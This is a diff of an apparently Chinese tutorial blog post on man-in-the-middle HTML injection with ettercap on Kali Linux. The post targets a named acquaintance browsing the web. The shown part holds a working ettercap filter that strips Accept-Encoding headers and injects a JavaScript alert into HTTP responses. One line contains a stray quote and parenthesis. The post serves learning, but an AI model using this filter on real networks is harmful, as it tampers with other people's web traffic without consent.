@@ -32,7 +32,7 @@ Kali系统下ettercap是预置的，所以我不需要额外的安装。
 好的，既然LGC在浏览网页，那就来个HTML注入好了。“Gengxin 想 ban 你 哦”。  
 我们首先要写一个过滤脚本。  
 
-~~~   
+{% highlight %}
 if (ip.proto == TCP && tcp.dst == 80)
 {
     if (search(DATA.data, "Accept-Encoding"))
@@ -43,11 +43,11 @@ if (ip.proto == TCP && tcp.dst == 80)
 }
 if (ip.proto == TCP && tcp.src == 80)
 {
-    replace("<head>", "<head><script type="text/javascript">alert('Gengxin想ban你哦Q/W\Q');</script>");
-    replace("<HEAD>", "<HEAD><script type="text/javascript">alert('Gengxin想ban你哦Q/W\Q')');</script>");
+    replace("<head>", "<head><script type="text/javascript">alert('Gengxin想ban你哦Q/W\\Q');</script>");
+    replace("<HEAD>", "<HEAD><script type="text/javascript">alert('Gengxin想ban你哦Q/W\\Q')');</script>");
     msg("成功注入Q'W'Q!!\n");
 }  
-~~~   
+{% endhighlight %}
 
 
 这段代码第一个if块，是如果网页源码中有Accept-Encoding的时候，替换掉它（Accept-Encoding是声明浏览器支持的编码类型，在这里可以理解为请求压缩的意思）。第二个if块就是我们插入HTML的地方了。js代码里`alert("")`会使网页出现一个弹窗。这就是我要达到的目的。  
